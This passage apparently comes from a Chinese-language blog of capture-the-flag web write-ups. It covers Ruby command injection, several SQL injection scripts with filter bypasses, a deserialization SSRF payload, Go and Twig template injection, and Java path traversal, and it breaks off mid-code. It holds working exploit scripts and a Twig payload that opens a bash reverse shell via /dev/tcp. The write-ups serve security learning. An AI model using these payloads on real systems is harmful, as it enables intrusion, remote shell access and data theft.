class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/convert.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">begin</span><br>    <span class="hljs-keyword">unless</span> params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br><br>    file = params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">unless</span> file.index(<span class="hljs-string">&#x27;..&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file.index(<span class="hljs-string">&#x27;/&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file =~ <span class="hljs-regexp">/^(.+)\.png$/</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br>    res = open(file, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    headers <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span><br>    <span class="hljs-string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="hljs-regexp">/\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&quot;\&quot;;\n&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>可以发现在convert和upload处都调用了open，因此我们只使用convert这个路由，先注入命令，由于存在可以读取文件的路由，我们直接将执行结果写入文件，再读取编码后的文件。</p><p>对于rce命令的过滤，我们利用base64编码绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span>():</span><br>    <span class="hljs-keyword">global</span> url,rce_data<br>    cmd = <span class="hljs-string">&quot;ls /&quot;</span><br>    en_cmd = base64.b64encode(cmd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    data = rce_data<br>    data[<span class="hljs-string">&#x27;file&#x27;</span>] = data[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-built_in">format</span>(en_cmd)<br>    r = requests.post(url=url,data = data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">global</span> url,read_data<br>    r = requests.post(url=url,data=read_data)<br>    en_text = r.text.split(<span class="hljs-string">&#x27;base64,&#x27;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(base64.b64decode(en_text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28087/convert&quot;</span><br>    rce_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;| `echo &#x27;&#123;&#125;&#x27; | base64 -d` &gt; 1.png&quot;</span><br>    &#125;<br>    read_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;1.png&quot;</span><br>    &#125;<br>    inject()<br>    read()<br></code></pre></td></tr></table></figure><h2 id="sql注入">3、SQL注入</h2><h3 id="nisa-hardsqlquine技术">1、NISA-hardsql（quine技术）</h3><p>这道题上来就先给了sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>首先是fuzz一下，发现空格过不了，or没有被屏蔽，于是可以构造语句如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/**/or/**/passwd/**/like/**/&#x27;&#x27;#</span><br></code></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28150/login.php&quot;</span><br><br><span class="hljs-comment"># username=bilala&amp;passwd=-1&#x27;/**/or/**/passwd/**/like/**/&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;#</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;bilala&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;&#x27;#&quot;</span><br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>loop = <span class="hljs-literal">True</span><br><span class="hljs-keyword">while</span> loop:<br>    loop = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(i) == <span class="hljs-string">&#x27;%&#x27;</span>):<br>            <span class="hljs-keyword">continue</span><br>        data[<span class="hljs-string">&#x27;passwd&#x27;</span>] = <span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#&quot;</span>.<span class="hljs-built_in">format</span>(flag + <span class="hljs-built_in">chr</span>(i) )<br><br>        r = requests.post(url=url,proxies=proxies,data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += <span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            loop = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是这样是有风险的，因为你没有对username做限制，直接passwd可能会爆破出来别的用户的密码（那只能limit试过去了。</p><p>于是进入之后可以得到源代码，接下来才进入quine的正题。</p><p>这里先附上两篇分析：</p><p>https://www.cnblogs.com/zhengna/p/15917521.html</p><p>https://www.anquanke.com/post/id/253570</p><h3 id="nssctfez_sql报错注入联合注入">2、NSSCTF—ez_sql（报错注入&amp;&amp;联合注入）</h3><p>这道题一度把我引入了布尔盲注，最后发现其实还是对于waf的探测不够准确。</p><p>首先，上来传参为1，这个得到的flag肯定是假的。</p><p>尝试了2,3等就没有了结果。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164252562.png" alt="image-20230401164252562" /></p><p>尝试引号闭合以及#闭合，发现仍然正常显示</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164448420.png" alt="image-20230401164448420" /></p><p>尝试使用union联合注入，通过报错发现select 1,2间的引号不见了，怀疑是被过滤了，则使用/**/绕过</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164612299.png" alt="image-20230401164612299" /></p><p>但是绕过之后发现依然不能够完成攻击，这时候怀疑可能还有其他的过滤，测试之下发现果然存在union被过滤了。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164839225.png" alt="image-20230401164839225" /></p><p>就这样一步步测试下去，最后使用联合注入成功拿到flag，也是非常地心累。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_payload</span>(<span class="hljs-params">payload</span>):</span><br>    new_payload = payload<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;/**/&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;oorr&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;ununionion&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> new_payload<br><br><br>url = <span class="hljs-string">&quot;http://43.142.108.3:28124/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_database</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,database()#&quot;</span>)<br>                     &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_tables</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_columns</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;NSS_tb&#x27;#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_content</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(concat_ws(&#x27;:&#x27;,id,Secr3t,flll444g)) from NSS_tb#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># get_database()</span><br>    <span class="hljs-comment"># get_all_tables()  NSS_tb,users</span><br>    <span class="hljs-comment"># get_all_columns() id,Secr3t,flll444g</span><br>    get_all_content()<br><br><br></code></pre></td></tr></table></figure><h3 id="suctfeasysqlsql_mode">3、2019SUCTF—EasySQL（sql_mode）</h3><p>这道题算是非常tricky的题目了，最重要的是要分析出背后的SQL语句。</p><p>首先是发现对于WAF中的数字会回显Nonono，这就非常有意思了。</p><p>先来一手SQL注入的FUZZ，发现屏蔽了大多数，但是没有屏蔽<code>||</code>，我直接来了一手布尔盲注。注出来数据库名之后发现限制长度了，于是这条路就断了。</p><p>于是分析SQL语句的返回结果，不是0就是1，那么意味着我们拼接的内容很有可能就是一个布尔表达式。</p><p>于是尝试</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure><p>发现直接得到了flag。</p><p>最后查看wp发现，真正的SQL语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &#123;&#125; <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure><p>在默认情况下，<code>||</code>在SQL语句中表示或，但是可以开启连接模式，官方的WP也是这么做的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure><p>最后成功拿到flag，存在堆叠注入我还没意识到orz。</p><h3 id="网鼎facebooksql查询结果反序列化">4、2018网鼎—FaceBook（sql查询结果反序列化）</h3><p>这道题考察的知识点相对还是比较全面的。</p><p>进入之后，存在一个登录界面和注册界面，尝试注册发现blog参数一直显示无效。</p><p>dirsearch扫描目录之后发现存在<code>robots.txt</code>，查看后发现存在<code>user.php</code></p><p>通过<code>user.php</code>找了blog的检查函数，从而成功注册。</p><p>注册之后，可以进入view.php查看对应的blog，发现url中的参数no可以注入。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001608480.png" alt="image-20230402001608480" /></p><p>尝试联合注入，union select被过滤，利用/**/绕过即可</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001734334.png" alt="image-20230402001734334" /></p><p>发现可以利用参数2进行回显，于是进一步表，列以及数值。</p><p>爆出数据如下，观察数据发现并不存在直接的blog数据存储，而是将user的信息以反序列化的形式存储在数据库。</p><p>那么也就意味着我们利用联合注入修改查询到的反序列化数据，就可以实现SSRF访问内网数据（注意此时的blog可以不考虑最初的url限制）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001913349.png" alt="image-20230402001913349" /></p><p>经过测试发现，data数据是对应的第四项，由此构造对应的payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">43.143.7.97:28965</span>//view.php?no=<span class="hljs-number">3</span>%<span class="hljs-number">20</span>union/**/select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(select &#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>\;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;admin4&quot;</span>\;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>\;i:<span class="hljs-number">20</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>\;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>\;&#125;&#x27;);#<br></code></pre></td></tr></table></figure><p>成功读取到flag。</p><p>补充，显示的内容会以base64形式编码，需要解码后获取。</p><h2 id="ssti">4、SSTI</h2><h3 id="sctf-loginmexff漏洞go模板注入">1、SCTF-loginme（XFF漏洞/Go模板注入）</h3><p>上来先是一个很明显的XFF</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154514295.png" alt="image-20220816154514295" style="zoom:50%;" /></p><p>关键点在于ClientIP的实现，好在我们可以找到ClientIP的实现，除了xff头，还存在X-Real-IP这个利用点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ClientIP 尽最大努力实现获取客户端 IP 的算法。</span><br><span class="hljs-comment">// 解析 X-Real-IP 和 X-Forwarded-For 以便于反向代理（nginx 或 haproxy）可以正常工作。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ClientIP</span><span class="hljs-params">(r *http.Request)</span> <span class="hljs-title">string</span></span> &#123;<br>xForwardedFor := r.Header.Get(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br>ip := strings.TrimSpace(strings.Split(xForwardedFor, <span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br>ip = strings.TrimSpace(r.Header.Get(<span class="hljs-string">&quot;X-Real-Ip&quot;</span>))<br><span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br><span class="hljs-keyword">if</span> ip, _, err := net.SplitHostPort(strings.TrimSpace(r.RemoteAddr)); err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>出现了这样的页面，用于显示用户信息。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154908285.png" alt="image-20220816154908285" style="zoom:50%;" /></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Login</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>idString, flag := c.GetQuery(<span class="hljs-string">&quot;id&quot;</span>)<br><span class="hljs-keyword">if</span> !flag &#123;<br>idString = <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>id, err := strconv.Atoi(idString)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>id = <span class="hljs-number">1</span><br>&#125;<br>TargetUser := structs.Admin<br><span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> structs.Users &#123;<br><span class="hljs-keyword">if</span> user.Id == id &#123;<br>TargetUser = user<br>&#125;<br>&#125;<br><br>age := TargetUser.Age<br><span class="hljs-keyword">if</span> age == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        <span class="hljs-comment">//*******************</span><br>        <span class="hljs-comment">//这里有age的注入点</span><br>        <span class="hljs-comment">//********************</span><br>age, flag = c.GetQuery(<span class="hljs-string">&quot;age&quot;</span>)<br><span class="hljs-keyword">if</span> !flag &#123;<br>age = <span class="hljs-string">&quot;forever 18 (Tell me the age)&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>tmpl, err := template.New(<span class="hljs-string">&quot;admin_index&quot;</span>).Parse(html)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>tmpl.Execute(c.Writer, TargetUser)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现源代码中在age这个点有渲染，同时我们可以找到age的注入点，猜测是不是go有SSTI。</p><p><a href="https://tyskill.github.io/posts/gossti">GO SSTI初探</a></p><p>于是照着文章里尝试看看能不能打出admin的Password，顺利拿到flag。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /></p><h3 id="bjdctf-cookie-stubletwig模板注入">2、BJDCTF-Cookie stuble（twig模板注入）</h3><p>打开界面，Hint提示看一下Cookies，同时发现前端会动态显示用户名</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png" alt="img" style="zoom:50%;" /></p><p>怀疑是PHP模板注入，测试了smarty的payload，发现不行</p><p>于是尝试了twig的payload，发现能够成功，于是反弹shell，拿下flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="xxe">5、XXE</h2><h3 id="nctf-xml-cookbook">1、NCTF-XML cookbook</h3><h3 id="网鼎20-filejava目录穿越excel-xxe">2、网鼎20-FileJava（目录穿越/Excel XXE）</h3><p>文件上传之后出现下载链接，发现可能存在任意文件读取目录</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150221722.png" alt="image-20220816150221722" style="zoom:50%;" /></p><p>尝试读取根目录的<code>/etc/passwd</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150356769.png" alt="image-20220816150356769" style="zoom:50%;" /></p><p>接下来尝试获取目录，我们利用500报错获取网站部署的路径。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151222621.png" alt="image-20220816151222621" style="zoom:50%;" /></p><p>接下来尝试获取网站的路由信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151522399.png" alt="image-20220816151522399" style="zoom:50%;" /></p><p>拉到路由之后，我们直接试试能不能利用Download的接口下载到class文件，从而反编译获得源代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>classname = <span class="hljs-string">&quot;DownloadSerlet&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28032/file_in_java/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>params = &#123;<br>    <span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/&#123;&#125;.class&quot;</span>.<span class="hljs-built_in">format</span>(classname)<br>&#125;<br><br>r = requests.get(url=url,params=params)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Download.class&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(r.content)<br></code></pre></td></tr></table></figure><p>拿到之后用<code>jd-gui</code>反编译，康康源代码，发现在<code>upload</code>的地方解析了xlsx文件，可以考虑是不是CVE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>   String savePath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>   String tempPath = getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>   File tempFile = <span class="hljs-keyword">new</span> File(tempPath);<br>   <span class="hljs-keyword">if</span> (!tempFile.exists())<br>     tempFile.mkdir(); <br>   String message = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">try</span> &#123;<br>     DiskFileItemFactory factory = <span class="hljs-keyword">new</span> DiskFileItemFactory();<br>     factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>     factory.setRepository(tempFile);<br>     ServletFileUpload upload = <span class="hljs-keyword">new</span> 